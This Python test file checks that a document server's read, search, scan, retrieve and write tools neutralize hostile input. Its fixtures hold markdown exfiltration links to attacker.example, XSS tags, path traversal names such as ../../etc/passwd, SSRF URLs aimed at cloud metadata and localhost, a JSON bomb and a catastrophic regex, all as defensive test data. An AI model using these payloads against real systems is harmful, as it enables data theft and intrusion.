"""Adversarial tests for the document read-side tools.

Plants hostile documents in the corpus and asserts the tools neutralize
exfiltration, injection, traversal, and denial-of-service vectors rather
than passing them through.
"""

import json

import pytest
from fastmcp.exceptions import ToolError

import arrowhead.tools.doc_retrieve as retrieve_module
from arrowhead.config import get_settings
from arrowhead.tools.doc_read import doc_read
from arrowhead.tools.doc_scan import doc_scan
from arrowhead.tools.doc_search import doc_search
from arrowhead.tools.doc_write import doc_write

MARKDOWN_EXFIL = [
    "![leak](http://attacker.example/?data=secret)",
    "[click](javascript:fetch('http://attacker.example'))",
    "<img src=x onerror=alert(1)>",
    "<script>steal()</script>",
]

TEXT_INJECTION = [
    "before\x1b[2J\x1b[31mANSI",
    "null\x00byte",
    "zero​width",
]

TRAVERSAL = [
    "../../etc/passwd.txt",
    "..\\..\\secrets.json",
    "/etc/hostname.txt",
]


@pytest.mark.parametrize("payload", MARKDOWN_EXFIL)
async def test_markdown_exfiltration_neutralized_on_read(docs, payload):
    (docs / "hostile.md").write_text(payload + "\n")
    result = await doc_read("hostile.md")
    assert "attacker.example" not in result["content"]
    assert "<script>" not in result["content"]
    assert "onerror" not in result["content"]


@pytest.mark.parametrize("payload", TEXT_INJECTION)
async def test_text_injection_stripped_on_read(docs, payload):
    (docs / "hostile.txt").write_text(payload)
    content = (await doc_read("hostile.txt"))["content"]
    assert "\x1b" not in content
    assert "\x00" not in content
    assert "​" not in content


@pytest.mark.parametrize("payload", TRAVERSAL)
async def test_traversal_refused_on_read(docs, payload):
    with pytest.raises(ToolError):
        await doc_read(payload)


async def test_json_bomb_refused_on_read(docs):
    (docs / "bomb.json").write_text("[" * 500 + "]" * 500)
    with pytest.raises(ToolError):
        await doc_read("bomb.json")


async def test_search_snippet_is_sanitized(docs):
    (docs / "hostile.md").write_text(
        "match ![x](http://attacker.example/?s=1) <script>go()</script>"
    )
    result = await doc_search("match")
    snippet = result["matches"][0]["snippet"]
    assert "attacker.example" not in snippet
    assert "<script>" not in snippet


async def test_catastrophic_regex_is_bounded(docs, monkeypatch):
    monkeypatch.setenv("ARROWHEAD_SEARCH_REGEX_ENABLED", "true")
    monkeypatch.setenv("ARROWHEAD_SEARCH_REGEX_TIMEOUT_MS", "100")
    get_settings.cache_clear()
    (docs / "target.txt").write_text("a" * 300 + "!")
    # Must return (possibly aborting the pattern), never hang.
    result = await doc_search(r"(a+)+$", use_regex=True)
    assert "match_count" in result


SECRET_VALUES = [
    "AKIAIOSFODNN7EXAMPLE",
    "-----BEGIN RSA PRIVATE KEY-----",
    "alice@example.com",
    "123-45-6789",
]


@pytest.mark.parametrize("secret", SECRET_VALUES)
async def test_scan_never_returns_the_raw_secret(docs, secret):
    (docs / "leak.txt").write_text(f"value: {secret} end")
    result = await doc_scan()
    assert secret not in json.dumps(result)


SSRF_URLS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1/admin",
    "http://10.0.0.1/",
    "http://[::1]/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
]


@pytest.mark.parametrize("url", SSRF_URLS)
async def test_retrieve_refuses_ssrf_targets(url):
    with pytest.raises(ToolError):
        await retrieve_module.doc_retrieve(url)


async def test_retrieve_neutralizes_exfiltration_from_remote(monkeypatch):
    async def fake_fetch(url):
        return {
            "status": 200,
            "content_type": "text/markdown",
            "body": "![x](http://attacker.example/?leak=1) <script>go()</script>",
        }

    monkeypatch.setattr(retrieve_module, "fetch_url", fake_fetch)
    result = await retrieve_module.doc_retrieve("https://example.com/x.md")
    assert "attacker.example" not in result["content"]
    assert "<script>" not in result["content"]


WRITE_TRAVERSAL = [
    "../../etc/passwd.txt",
    "..\\..\\system.json",
    "/etc/cron.txt",
    "sub/../../escape.txt",
]


@pytest.mark.parametrize("path", WRITE_TRAVERSAL)
async def test_write_traversal_refused(docs, path):
    with pytest.raises(ToolError):
        await doc_write(path, "payload")


async def test_write_symlink_escape_refused(docs, tmp_path_factory):
    outside_dir = tmp_path_factory.mktemp("outside")
    (docs / "link").symlink_to(outside_dir)
    # A write through a symlink that escapes the corpus must be refused.
    with pytest.raises(ToolError):
        await doc_write("link/evil.txt", "payload")
    assert not (outside_dir / "evil.txt").exists()


async def test_write_quota_enforced(docs, monkeypatch):
    monkeypatch.setenv("ARROWHEAD_DOC_WRITE_QUOTA_BYTES", "20")
    get_settings.cache_clear()
    await doc_write("a.txt", "x" * 15)
    with pytest.raises(ToolError):
        await doc_write("b.txt", "y" * 15)

